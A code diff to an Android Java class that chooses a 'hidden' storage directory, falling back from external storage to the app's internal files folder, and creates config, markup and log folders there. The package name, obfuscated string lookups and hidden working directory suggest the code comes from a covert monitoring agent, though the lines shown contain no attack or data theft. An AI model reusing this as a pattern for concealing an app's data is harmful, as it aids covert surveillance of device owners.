@@ -15,6 +15,7 @@ import android.os.Environment;
 import android.os.StatFs;
 
 import com.android.networking.Messages;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
@@ -69,30 +70,30 @@ public class Path {
 		LOG_DIR = Messages.getString("24.2"); //$NON-NLS-1$
 
 		try {
-			if (haveStorage()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
-				}
-
-				boolean success = true;
-
-				success &= createDirectory(conf());
-				success &= createDirectory(markup());
-				success &= createDirectory(logs());
-
-				if (Cfg.FILE && Cfg.DEBUG) {
-					DateTime dt = new DateTime();
-
-					curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
-
-					final File file = new File(logs(), curLogFile);
-
-					file.createNewFile();
-				}
-
-				initialized = success;
-				return success;
+			setStorage();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 			}
+
+			boolean success = true;
+
+			success &= createDirectory(conf());
+			success &= createDirectory(markup());
+			success &= createDirectory(logs());
+
+			if (Cfg.FILE && Cfg.DEBUG) {
+				DateTime dt = new DateTime();
+
+				curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
+
+				final File file = new File(logs(), curLogFile);
+
+				file.createNewFile();
+			}
+
+			initialized = success;
+			return success;
+
 		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
@@ -109,7 +110,7 @@ public class Path {
 	/**
 	 * Check.storage. //$NON-NLS-1$
 	 */
-	public static boolean haveStorage() {
+	public static void setStorage() {
 		boolean mExternalStorageAvailable = false;
 		boolean mExternalStorageWriteable = false;
 		final String state = Environment.getExternalStorageState();
@@ -130,10 +131,14 @@ public class Path {
 
 		if (mExternalStorageWriteable) {
 			hidden = Environment.getExternalStorageDirectory() + Messages.getString("24.5"); //$NON-NLS-1$ //$NON-NLS-2$
-			return true;
 		} else {
-			hidden = null;
-			return false;
+
+			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + Messages.getString("24.5");
+			;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (setStorage): " + hidden + " freespace: " + freeSpace());
 		}
 	}
 
@@ -216,20 +221,22 @@ public class Path {
 	 * @return the long
 	 */
 	public static long freeSpace() {
-		if (haveStorage()) {
-			final StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+
+		try {
+			final StatFs stat = new StatFs(hidden);
 			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
 			final long megAvailable = bytesAvailable / 1048576;
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return bytesAvailable;
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (freeSpace) Error: no external path");//$NON-NLS-1$
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				ex.printStackTrace();
 			}
 			return 0;
 		}
+
 	}
 
 	public static boolean initialized() {
